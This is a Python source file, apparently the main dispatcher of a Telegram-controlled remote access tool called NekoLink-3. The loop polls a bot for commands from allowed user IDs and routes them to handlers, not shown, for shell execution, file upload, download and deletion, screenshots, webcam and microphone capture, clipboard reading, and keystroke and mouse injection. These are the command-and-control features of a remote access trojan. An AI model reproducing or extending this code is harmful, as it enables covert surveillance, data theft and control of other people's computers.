import time
from src.bot import get_updates, send_message, BOT_TOKEN, ALLOWED_IDS
from src.commands import *

def main():
    print("NekoLink-3 Running...")
    last_update_id = 0
    
    while True:
        try:
            updates = get_updates(last_update_id + 1)
            for update in updates:
                last_update_id = update.get("update_id", last_update_id)
                msg = update.get("message")
                if not msg:
                    continue
                
                chat_id = msg["chat"]["id"]
                user_id = msg["from"]["id"]
                
                if user_id not in ALLOWED_IDS:
                    send_message(chat_id, "Unauthorized")
                    continue
                
                text = msg.get("text", "")
                if not text or not text.startswith("/"):
                    continue
                
                parts = text.split()
                cmd = parts[0].lower()
                args = parts[1:] if len(parts) > 1 else []
                
                # Command routing
                if cmd == "/start":
                    send_message(chat_id, "NekoLink3 Active\nCommands: /exec, /info, /ps, /kill, /cd, /upload, /download, /screenshot, /cam, /mic, /notify, /popup, /shutdown, /restart, /lock, /sleep, /type, /click, /key, /clipboard, /setclip, /list, /search, /delete, /move, /zip, /wallpaper, /focus, /minimize, /active, /uptime")
                
                elif cmd == "/exec":
                    handle_exec(chat_id, " ".join(args), send_message)
                elif cmd == "/info":
                    handle_info(chat_id, send_message)
                elif cmd == "/ps":
                    handle_ps(chat_id, send_message)
                elif cmd == "/kill" and args:
                    handle_kill(chat_id, args[0], send_message)
                elif cmd == "/cd" and args:
                    handle_cd(chat_id, " ".join(args), send_message)
                elif cmd == "/upload" and args:
                    handle_upload(chat_id, args[0], send_message, send_file)
                elif cmd == "/download" and len(args) >= 2:
                    handle_download(chat_id, args[0], args[1], send_message)
                elif cmd == "/screenshot":
                    handle_screenshot(chat_id, send_file)
                elif cmd == "/cam":
                    handle_cam(chat_id, send_file)
                elif cmd == "/mic":
                    duration = int(args[0]) if args else 5
                    handle_mic(chat_id, duration, send_file)
                elif cmd == "/notify" and args:
                    handle_notify(chat_id, " ".join(args), send_message)
                elif cmd == "/popup" and args:
                    handle_popup(chat_id, " ".join(args), send_message)
                elif cmd == "/shutdown":
                    handle_shutdown(chat_id, send_message)
                elif cmd == "/restart":
                    handle_restart(chat_id, send_message)
                elif cmd == "/lock":
                    handle_lock(chat_id, send_message)
                elif cmd == "/sleep":
                    handle_sleep(chat_id, send_message)
                elif cmd == "/type" and args:
                    handle_type(chat_id, " ".join(args), send_message)
                elif cmd == "/click":
                    x = args[0] if len(args) > 0 else None
                    y = args[1] if len(args) > 1 else None
                    handle_click(chat_id, send_message, x, y)
                elif cmd == "/key" and args:
                    handle_key(chat_id, args[0], send_message)
                elif cmd == "/clipboard":
                    handle_clipboard(chat_id, send_message)
                elif cmd == "/setclip" and args:
                    handle_setclip(chat_id, " ".join(args), send_message)
                elif cmd == "/list":
                    path = args[0] if args else "."
                    handle_list(chat_id, path, send_message)
                elif cmd == "/search" and args:
                    handle_search(chat_id, args[0], send_message)
                elif cmd == "/delete" and args:
                    handle_delete(chat_id, args[0], send_message)
                elif cmd == "/move" and len(args) >= 2:
                    handle_move(chat_id, args[0], args[1], send_message)
                elif cmd == "/zip" and args:
                    handle_zip(chat_id, args[0], send_file)
                elif cmd == "/wallpaper" and args:
                    handle_wallpaper(chat_id, " ".join(args), send_message)
                elif cmd == "/focus" and args:
                    handle_focus(chat_id, " ".join(args), send_message)
                elif cmd == "/minimize" and args:
                    handle_minimize(chat_id, " ".join(args), send_message)
                elif cmd == "/active":
                    handle_active(chat_id, send_message)
                elif cmd == "/uptime":
                    handle_uptime(chat_id, send_message)
                else:
                    send_message(chat_id, "Unknown command")
        
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(5)

if __name__ == "__main__":
    main()
